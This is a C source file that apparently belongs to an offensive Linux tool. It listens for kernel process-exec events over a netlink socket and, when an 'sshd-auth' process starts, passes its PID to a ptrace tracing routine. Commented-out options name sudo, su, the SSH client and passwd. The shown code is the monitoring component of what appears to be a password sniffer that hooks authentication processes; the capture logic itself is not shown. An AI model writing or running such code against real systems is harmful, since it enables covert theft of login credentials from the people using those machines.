#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/connector.h>
#include <linux/cn_proc.h>
#include <errno.h>
#include <signal.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#define FILE_PLISTEN 1
#include "config.h"
#include "helpers.h"
#include "tracers.h"


// Function to extract the command name from the /proc/<pid>/comm file
char *get_command_from_pid(pid_t pid) {
    static char cmd_name[256]; // Buffer for the command name
    FILE *fp;
    char path[256];
    // Build the path to /proc/<pid>/comm
    snprintf(path, sizeof(path), "/proc/%d/comm", pid);
    // Open the comm file
    fp = fopen(path, "r");
    if (!fp) {
        perror("Error opening /proc/<pid>/comm");
        return NULL;
    }
    // Read the command name
    if (fgets(cmd_name, sizeof(cmd_name), fp) == NULL) {
        fclose(fp);
        return NULL;
    }
    // Remove trailing newline if it exists
    cmd_name[strcspn(cmd_name, "\n")] = 0;

    fclose(fp);
    return cmd_name;
}





void childsig(int x) {
  fprintf(stderr, "[-] Plisteneter %d has been killed %d\n", getpid(), x);
  exit(0);
}

int nl_connect(void) {
  int rc = 0;
  int nl_sock = 0;
  struct sockaddr_nl sa_nl;

  memset(&sa_nl, 0, sizeof(sa_nl));
  nl_sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_CONNECTOR);

  if (nl_sock == -1) {
    fatal("Unable to create nl_socket\n");
    return -1;
  }

  sa_nl.nl_family = AF_NETLINK;
  sa_nl.nl_groups = CN_IDX_PROC;
  sa_nl.nl_pid = getpid();

  rc = bind(nl_sock, (struct sockaddr *)&sa_nl, sizeof(sa_nl));

  if (rc == -1) {
    close(nl_sock);
    fatal("Unable to bind nl_socket\n");
  }

  return nl_sock;
}

int set_proc_ev_listen(int nl_sock, bool enable) {
  int rc = 0;
  struct __attribute__ ((aligned(NLMSG_ALIGNTO))) {
    struct nlmsghdr nl_hdr;
    struct __attribute__ ((__packed__)) {
      struct cn_msg cn_msg;
      enum proc_cn_mcast_op cn_mcast;
    };
  } nlcn_msg;

  memset(&nlcn_msg, 0, sizeof(nlcn_msg));

  nlcn_msg.nl_hdr.nlmsg_len = sizeof(nlcn_msg);
  nlcn_msg.nl_hdr.nlmsg_pid = getpid();
  nlcn_msg.nl_hdr.nlmsg_type = NLMSG_DONE;

  nlcn_msg.cn_msg.id.idx = CN_IDX_PROC;
  nlcn_msg.cn_msg.id.val = CN_VAL_PROC;
  nlcn_msg.cn_msg.len = sizeof(enum proc_cn_mcast_op);

  nlcn_msg.cn_mcast = enable ? PROC_CN_MCAST_LISTEN : PROC_CN_MCAST_IGNORE;

  rc = send(nl_sock, &nlcn_msg, sizeof(nlcn_msg), 0);

  if (rc == -1)
    fatal("netlink unable to send\n");

  return 0;
}

int handle_proc_ev(int nl_sock) {
  pid_t child = 0;
  int rc = 0;

  struct __attribute__ ((aligned(NLMSG_ALIGNTO))) {
    struct nlmsghdr nl_hdr;
    struct __attribute__ ((__packed__)) {
      struct cn_msg cn_msg;
      struct proc_event proc_ev;
    };
  } nlcn_msg;

  memset(&nlcn_msg, 0, sizeof(nlcn_msg));

  while (1) {
    rc = recv(nl_sock, &nlcn_msg, sizeof(nlcn_msg), 0);

    if (rc == 0 || rc == -1)
      continue;

    switch (nlcn_msg.proc_ev.what) {
      case PROC_EVENT_EXEC:
      char *cmd_name = get_command_from_pid(nlcn_msg.proc_ev.event_data.id.process_pid);
      if (cmd_name == NULL) {
          return 0;
      }

      // Log the command name (optional for debugging)
      printf("New process spawned: %s\n", cmd_name);
      // Check if the process is an sshd-auth process
      if (strcmp(cmd_name, "sshd-auth") == 0) {
          // Now you can attach ptrace to this process
          trace_process(nlcn_msg.proc_ev.event_data.id.process_pid);
      }

        //Do this check here so we don't spawn a process for nothing
//        if (!ENABLE_SUDO && !ENABLE_SU && !ENABLE_SSH_CLIENT && !ENABLE_PASSWD)
//          break;

//        child = fork();
//        if (child == 0) {
//          trace_process(nlcn_msg.proc_ev.event_data.id.process_pid);
//          exit(0);
//        }
        break;
      case PROC_EVENT_UID:
        //Do this check here so we don't spawn a process for nothing
//        if (!ENABLE_SSH)
          break;

//	char *cmd_name = get_command_from_proc_event(&nlcn_msg.proc_ev);

//        if (strstr(cmd_name, "sshd-auth") != NULL) {
//	  child = fork();
//          if (child == 0) {
//            trace_process(nlcn_msg.proc_ev.event_data.id.process_pid);
//            exit(0);
//	  }
//        }
        break;
      default:
        break;
    }
  }
}

void plisten(void) {
  int nl_sock = 0;
  int rc = EXIT_SUCCESS;

  signal(SIGINT, childsig);
  signal(SIGQUIT, childsig);
  signal(SIGHUP, childsig);
  signal(SIGPIPE, childsig);
  signal(SIGTERM, childsig);
  signal(SIGSEGV, childsig);
  signal(SIGBUS, childsig);
  signal(SIGILL, childsig);
  signal(SIGCHLD, SIG_IGN);

  nl_sock = nl_connect();

  if (nl_sock == -1)
    fatal("nl_connect() failed\n");

  rc = set_proc_ev_listen(nl_sock, true);

  if (rc == -1) {
    close(nl_sock);
    fatal("set_proc_ev_listen failed\n");
  }

  handle_proc_ev(nl_sock);
}
